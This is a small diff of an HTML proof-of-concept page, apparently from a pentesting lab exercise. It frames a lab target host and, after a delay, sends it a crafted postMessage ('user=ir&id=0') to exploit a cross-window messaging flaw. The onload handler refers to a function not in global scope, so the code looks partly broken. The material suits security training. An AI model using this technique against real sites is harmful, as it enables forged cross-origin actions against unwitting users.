@@ -1,9 +1,11 @@
 <html>
   <body>
-    <iframe src="http://ptl-9485b2e0-7c0cace5.libcurl.so/" id="frame1">
+    <iframe src="http://ptl-9485b2e0-7c0cace5.libcurl.so/"  onload=hack() id="frame1">
     <script>
-      var wn = document.getElementById('frame1').contentWindow;
-      wn.postMessage('user=ir&id=0');
+    setTimeout( function hack()
+      {
+var wn = document.getElementById('frame1').contentWindow;
+      wn.postMessage('user=ir&id=0');},2000);
       </script>
       </body>
     </html>
